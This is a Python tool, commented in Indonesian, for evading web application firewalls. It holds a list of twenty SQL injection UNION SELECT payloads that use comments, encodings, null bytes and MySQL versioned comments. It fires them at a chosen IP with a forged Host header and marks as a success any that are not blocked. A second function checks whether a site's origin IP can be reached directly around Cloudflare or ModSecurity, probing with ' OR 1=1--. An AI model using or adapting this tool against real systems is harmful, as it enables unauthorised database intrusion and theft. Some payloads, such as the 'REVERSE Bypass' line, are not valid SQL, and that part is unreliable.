#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
from rich.console import Console
from rich.table import Table
from rich import box

console = Console()

# ============================================================
# WAF BYPASS PAYLOAD DATABASE
# ============================================================
WAF_BYPASS_PAYLOADS = [
    ("Comment /**/", "1'/**/UNION/**/SELECT/**/1,2,3-- -"),
    ("Comment /**_*/", "1'/**_*/UNION/**_*/SELECT/**_*/1,2,3-- -"),
    ("Newline %0A", "1'%0AUNION%0ASELECT%0A1,2,3-- -"),
    ("MySQL Versioned", "1'/*!50000UNION*//*!50000SELECT*/1,2,3-- -"),
    ("Distinct Bypass", "1' UNION DISTINCT SELECT 1,2,3-- -"),
    ("Hex Encode", "1' UNION SELECT unhex(hex(1)),unhex(hex(2)),unhex(hex(3))-- -"),
    ("CONVERT Latin1", "1' UNION SELECT CONVERT(1 USING latin1),2,3-- -"),
    ("CAST Bypass", "1' UNION SELECT cast(1 as char),2,3-- -"),
    ("Binary Bypass", "1' UNION SELECT binary(1),2,3-- -"),
    ("NULL Byte", "1' UNION%00SELECT%001,2,3-- -"),
    ("Mixed All", "1'/*!50000%55NION*//**//*!50000%53ELECT*/1,2,3-- -"),
    ("REVERSE Bypass", "1' REVERSE(noinu)+REVERSE(tceles) 1,2,3-- -"),
    ("Union ALL SELECT", "1' UNION+ALL+SELECT 1,2,3-- -"),
    ("Double Query", "1' UNIUNIONON SELESELECTCT 1,2,3-- -"),
    ("Triple Encode", "1'%252520UNION%252520SELECT%2525201,2,3-- -"),
    ("AND 1=1 Bypass", "1' AND 1=1 UNION SELECT 1,2,3-- -"),
    ("OR 1=1 Bypass", "1' OR 1=1 UNION SELECT 1,2,3-- -"),
    ("DISTINCTROW", "1' UNION DISTINCTROW SELECT 1,2,3-- -"),
    ("MAKE_SET Bypass", "1' UNION SELECT MAKE_SET(1,1,2,3)-- -"),
    ("CONCAT_WS", "1' UNION SELECT CONCAT_WS(0x2c,1,2,3)-- -"),
]

def waf_bypass_test(ip, domain):
    """Test WAF bypass pada IP target"""
    results = []
    
    for name, payload in WAF_BYPASS_PAYLOADS:
        try:
            url = f"http://{ip}/{payload}" if '/' in payload else f"http://{ip}?id={payload}"
            r = requests.get(url, timeout=5, headers={'Host': domain})
            
            if r.status_code == 200:
                results.append((name, "✅ SUCCESS", r.status_code))
            elif r.status_code in [403, 406, 429]:
                results.append((name, "❌ BLOCKED", r.status_code))
            else:
                results.append((name, "⚠️ UNKNOWN", r.status_code))
        except:
            results.append((name, "❌ ERROR", "Timeout"))
    
    return results

def ip_protection_check(ip, domain):
    """Cek apakah IP asli dilindungi oleh WAF / Firewall"""
    protection_status = {
        'waf_detected': False,
        'direct_access': False,
        'port_80': False,
        'port_443': False,
        'host_header_required': False,
    }
    
    try:
        # Cek akses langsung
        r = requests.get(f"http://{ip}", timeout=5)
        if r.status_code == 200:
            protection_status['direct_access'] = True
            protection_status['port_80'] = True
        elif r.status_code in [301, 302]:
            protection_status['direct_access'] = True
            protection_status['port_80'] = True
        else:
            protection_status['port_80'] = False
    except:
        pass
    
    try:
        # Cek HTTPS
        r = requests.get(f"https://{ip}", timeout=5, verify=False)
        if r.status_code == 200:
            protection_status['port_443'] = True
        elif r.status_code in [301, 302]:
            protection_status['port_443'] = True
    except:
        pass
    
    try:
        # Cek dengan Host header
        r = requests.get(f"http://{ip}", timeout=5, headers={'Host': domain})
        if r.status_code == 200:
            protection_status['host_header_required'] = True
    except:
        pass
    
    # Deteksi WAF dari header
    try:
        r = requests.get(f"http://{ip}/?test=' OR 1=1--", timeout=5, headers={'Host': domain})
        if r.status_code in [403, 406, 429]:
            protection_status['waf_detected'] = True
        if 'cloudflare' in str(r.headers).lower():
            protection_status['waf_detected'] = True
        if 'mod_security' in str(r.headers).lower():
            protection_status['waf_detected'] = True
    except:
        pass
    
    return protection_status
